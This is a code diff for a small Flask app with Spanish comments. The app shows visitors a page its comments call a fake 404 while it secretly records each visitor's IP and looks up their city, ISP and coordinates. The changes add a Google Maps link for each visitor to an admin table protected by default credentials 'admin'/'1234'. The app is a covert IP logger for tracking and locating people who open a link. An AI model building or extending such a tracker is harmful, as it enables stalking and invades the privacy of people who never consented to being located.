@@ -7,11 +7,11 @@ app = Flask(__name__)
 
 visitas = []
 
-# 🔐 Credenciales (cámbialas)
-USUARIO = "admin"
-PASSWORD = "1234"
+# 🔐 Credenciales (usa variables de entorno en producción)
+USUARIO = os.environ.get("USER", "admin")
+PASSWORD = os.environ.get("PASS", "1234")
 
-# 🔹 Auth básica
+# 🔐 Auth básica
 def check_auth(username, password):
     return username == USUARIO and password == PASSWORD
 
@@ -36,7 +36,7 @@ def obtener_ip_real():
     ip = ip.split(',')[0].strip()
     return ip
 
-# 🔹 Info IP
+# 🔹 Obtener info de la IP
 def obtener_info_ip(ip):
     try:
         res = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
@@ -56,13 +56,15 @@ def obtener_info_ip(ip):
             "lon": 0
         }
 
-# 🔹 Página principal (404)
+# 🔹 Página principal (404 pero guarda datos)
 @app.route("/")
 def inicio():
     ip = obtener_ip_real()
     tipo = "IPv6" if ":" in ip else "IPv4"
     fecha = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     info = obtener_info_ip(ip)
+
+    mapa = f"https://www.google.com/maps?q={info['lat']},{info['lon']}"
 
     visitas.append({
         "ip": ip,
@@ -72,7 +74,8 @@ def inicio():
         "ciudad": info["ciudad"],
         "isp": info["isp"],
         "lat": info["lat"],
-        "lon": info["lon"]
+        "lon": info["lon"],
+        "mapa": mapa
     })
 
     return """
@@ -96,6 +99,7 @@ def admin():
             <td>{v['ciudad']}</td>
             <td>{v['isp']}</td>
             <td>{v['lat']}, {v['lon']}</td>
+            <td><a href="{v['mapa']}" target="_blank">🌎 Ver</a></td>
         </tr>
         """
 
@@ -110,6 +114,7 @@ def admin():
             <th>Ciudad</th>
             <th>ISP</th>
             <th>Coordenadas</th>
+            <th>Mapa</th>
         </tr>
         {tabla}
     </table>
